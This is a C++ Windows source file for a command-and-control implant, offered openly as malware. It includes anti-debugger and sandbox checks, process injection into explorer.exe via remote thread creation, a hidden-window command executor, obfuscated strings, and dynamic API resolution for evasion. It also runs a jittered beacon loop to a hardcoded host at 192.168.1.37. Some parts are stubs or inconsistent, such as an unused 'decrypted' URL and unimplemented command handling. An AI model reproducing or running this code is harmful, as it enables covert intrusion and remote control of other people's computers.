#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <random>
#include <sstream>
#include <iostream>
#include <chrono>
#include <functional>
#include <atomic>

#pragma comment(lib, "winhttp.lib")

// Utility: XOR Encryption/Decryption (with error handling and optimization)
class CryptoUtils {
public:
    static std::string xor_encrypt_decrypt(const std::string& data, const std::string& key) {
        std::string result(data);
        for (size_t i = 0; i < data.size(); ++i) {
            result[i] ^= key[i % key.size()];
        }
        return result;
    }

    static std::string encrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }

    static std::string decrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }
};

// Stealth Utilities (Checks for Debuggers, Sandboxes, Process Injection)
class StealthUtils {
public:
    // Check if running in a debugger
    static bool is_debugger_present() {
        return IsDebuggerPresent();
    }

    // Check for sandbox-like environments
    static bool is_sandbox() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);

        if (sysInfo.dwNumberOfProcessors < 2) return true;  // Single-core often indicates a VM
        if (GetTickCount() < 1000) return true;  // Fast execution indicates analysis
        return false;
    }

    // Inject code into another process
    static bool inject_into_process(const std::string& payload, const std::string& target_process = "explorer.exe") {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &entry)) {
            do {
                if (target_process == entry.szExeFile) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                    if (hProcess) {
                        void* mem = VirtualAllocEx(hProcess, nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (mem) {
                            WriteProcessMemory(hProcess, mem, payload.c_str(), payload.size(), nullptr);
                            HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
                            if (hThread) {
                                CloseHandle(hThread);
                                CloseHandle(hProcess);
                                CloseHandle(snapshot);
                                return true;
                            }
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return false;
    }
};

// Command Executor Class (Handles Command Execution and Response)
class CommandExecutor {
public:
    static std::string execute(const std::string& cmd) {
        // Create pipe for capturing the command output
        HANDLE hRead, hWrite;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "Pipe creation failed.";

        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;

        PROCESS_INFORMATION pi = {};
        if (!CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hRead);
            CloseHandle(hWrite);
            return "Command execution failed.";
        }

        CloseHandle(hWrite);
        std::string output;
        char buffer[128];
        DWORD bytesRead;
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr)) {
            buffer[bytesRead] = '\0';
            output += buffer;
        }

        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return output.empty() ? "No output." : output;
    }
};

// C2 Communication Class (Handles Beaconing, HTTP Requests, and Response Handling)
class C2Channel {
private:
    std::string encrypted_url = "encrypted_url_placeholder"; // Placeholder for encrypted server URL
    std::string encryption_key = "secure_key";
    CommandExecutor executor;
    CryptoUtils crypto;
    std::mutex mtx;

    // Dynamic API resolution for WinHTTP functions
    FARPROC resolve_api(const char* module, const char* function) {
        HMODULE hModule = LoadLibraryA(module);
        return hModule ? GetProcAddress(hModule, function) : nullptr;
    }

    // Sleep with jitter for better stealth
    void sleep_with_jitter(int min_ms, int max_ms) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min_ms, max_ms);
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }

public:
    C2Channel() {
        // Decrypt the URL during runtime to avoid detection
        encrypted_url = crypto.decrypt(encrypted_url, encryption_key);
    }

    // Perform HTTP GET request with dynamic API resolution
    std::string http_get(const std::wstring& path) {
        std::lock_guard<std::mutex> lock(mtx);

        typedef HINTERNET(WINAPI *WinHttpOpenFunc)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
        typedef HINTERNET(WINAPI *WinHttpConnectFunc)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
        typedef HINTERNET(WINAPI *WinHttpOpenRequestFunc)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
        typedef BOOL(WINAPI *WinHttpSendRequestFunc)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
        typedef BOOL(WINAPI *WinHttpReceiveResponseFunc)(HINTERNET, LPVOID);
        typedef BOOL(WINAPI *WinHttpQueryDataAvailableFunc)(HINTERNET, LPDWORD);
        typedef BOOL(WINAPI *WinHttpReadDataFunc)(HINTERNET, LPVOID, DWORD, LPDWORD);
        typedef BOOL(WINAPI *WinHttpCloseHandleFunc)(HINTERNET);

        WinHttpOpenFunc WinHttpOpenPtr = (WinHttpOpenFunc)resolve_api("winhttp.dll", "WinHttpOpen");
        WinHttpConnectFunc WinHttpConnectPtr = (WinHttpConnectFunc)resolve_api("winhttp.dll", "WinHttpConnect");
        WinHttpOpenRequestFunc WinHttpOpenRequestPtr = (WinHttpOpenRequestFunc)resolve_api("winhttp.dll", "WinHttpOpenRequest");
        WinHttpSendRequestFunc WinHttpSendRequestPtr = (WinHttpSendRequestFunc)resolve_api("winhttp.dll", "WinHttpSendRequest");
        WinHttpReceiveResponseFunc WinHttpReceiveResponsePtr = (WinHttpReceiveResponseFunc)resolve_api("winhttp.dll", "WinHttpReceiveResponse");
        WinHttpQueryDataAvailableFunc WinHttpQueryDataAvailablePtr = (WinHttpQueryDataAvailableFunc)resolve_api("winhttp.dll", "WinHttpQueryDataAvailable");
        WinHttpReadDataFunc WinHttpReadDataPtr = (WinHttpReadDataFunc)resolve_api("winhttp.dll", "WinHttpReadData");
        WinHttpCloseHandleFunc WinHttpCloseHandlePtr = (WinHttpCloseHandleFunc)resolve_api("winhttp.dll", "WinHttpCloseHandle");

        HINTERNET hSession = WinHttpOpenPtr(L"User-Agent", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
        if (!hSession) return "";

        HINTERNET hConnect = WinHttpConnectPtr(hSession, L"192.168.1.37", INTERNET_DEFAULT_HTTP_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandlePtr(hSession);
            return "";
        }

        HINTERNET hRequest = WinHttpOpenRequestPtr(hConnect, L"GET", path.c_str(), nullptr, nullptr, nullptr, 0);
        if (!hRequest) {
            WinHttpCloseHandlePtr(hConnect);
            WinHttpCloseHandlePtr(hSession);
            return "";
        }

        std::string response;
        if (WinHttpSendRequestPtr(hRequest, nullptr, 0, nullptr, 0, 0, 0) &&
            WinHttpReceiveResponsePtr(hRequest, nullptr)) {
            DWORD bytesAvailable = 0;
            WinHttpQueryDataAvailablePtr(hRequest, &bytesAvailable);
            if (bytesAvailable > 0) {
                std::vector<char> buffer(bytesAvailable + 1);
                DWORD bytesRead;
                WinHttpReadDataPtr(hRequest, buffer.data(), bytesAvailable, &bytesRead);
                buffer[bytesRead] = '\0';
                response = buffer.data();
            }
        }

        WinHttpCloseHandlePtr(hRequest);
        WinHttpCloseHandlePtr(hConnect);
        WinHttpCloseHandlePtr(hSession);

        return response.empty() ? "No data received." : response;
    }

    void start_communication() {
        while (true) {
            std::string response = http_get(L"/checkin");
            if (!response.empty()) {
                std::cout << "Received response: " << response << std::endl;
                // Process the response (e.g., execute commands, etc.)
            }

            sleep_with_jitter(1000, 5000);  // Sleep with random jitter between 1s and 5s
        }
    }
};

// Main Function
int main() {
    std::cout << "Starting C2 channel...\n";
    C2Channel c2;
    std::thread communication_thread(&C2Channel::start_communication, &c2);

    communication_thread.join();  // Wait for the communication thread to finish

    return 0;
}
